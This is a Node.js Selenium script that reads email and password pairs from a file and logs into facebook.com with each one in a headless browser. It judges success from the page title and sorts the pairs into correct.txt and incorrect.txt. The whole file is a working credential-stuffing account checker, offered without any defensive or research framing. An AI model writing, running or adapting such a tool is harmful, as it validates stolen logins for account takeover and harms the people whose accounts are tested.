const { Builder, By, Key, until } = require("selenium-webdriver")
const firefox = require("selenium-webdriver/firefox")
const fs = require("fs")

const loginsString = fs.readFileSync("./logins.txt", { encoding: "utf8" })

//parse the string to make an array
const loginsArr = loginsString.split(/\r\n\s\d{1,3}\s/).map((val) => {
  const valArr = val.split(/\t/);
  return { email: valArr[0], password: valArr[1] };
});
//display the resulting array
console.log("Input(Parsed into an Array):\n", loginsArr)

async function loginCheckAndRecord(login, correct, incorrect) {
  const options = new firefox.Options()
    .headless()
    .windowSize({ width: 640, height: 480 });
  let driver = await new Builder()
    .forBrowser("firefox")
    .setFirefoxOptions(options)
    .build();

  try {
    process.stdout.write(" .");
    await driver.get("https://www.facebook.com");
    await driver
      .findElement(By.name("email"))
      .sendKeys(login.email, Key.TAB, login.password, Key.RETURN);

    process.stdout.write(".");
    await driver.wait(
      until.stalenessOf(await driver.findElement(By.css("body")))
    );

    process.stdout.write(". ");
    let title = "";
    while (title == "") {
      title = await driver.getTitle();
    }
    if (
      title == "Log into Facebook" ||
      title == "Facebook - Log In or Sign Up"
    ) {
      console.log("Incorrect!")
      incorrect.push(login)
    } else {
      console.log("Correct!")
      correct.push(login)
    }
  } catch (err) {
    console.log(err)
  } finally {
    await driver.quit()
  }
}

const writeResults = results => {
  const write = (result, filename) => {
    //format
    const text = result.map(val => {
      return (val.email + "\t\t" + val.password)
    }).join("\r\n");
    //write
    fs.writeFile(filename, text, (err) => {
      if (err) return console.log(err);
    });
  };
  //run write
  write(results[0], "correct.txt")
  write(results[1], "incorrect.txt")

  console.log("*".repeat(16))
  console.log("Done. Exiting .. ")
}

async function filterFunc(loginsArr) {
  console.log("Filtering ...")
  let correct = [], incorrect = []
  for (let i = 0; i < loginsArr.length; i++) {
    const num = i + 1
    process.stdout.write(num.toString())
    await loginCheckAndRecord(
      loginsArr[i],
      correct,
      incorrect
    )
  }
  return writeResults([correct, incorrect])
}

filterFunc(loginsArr)
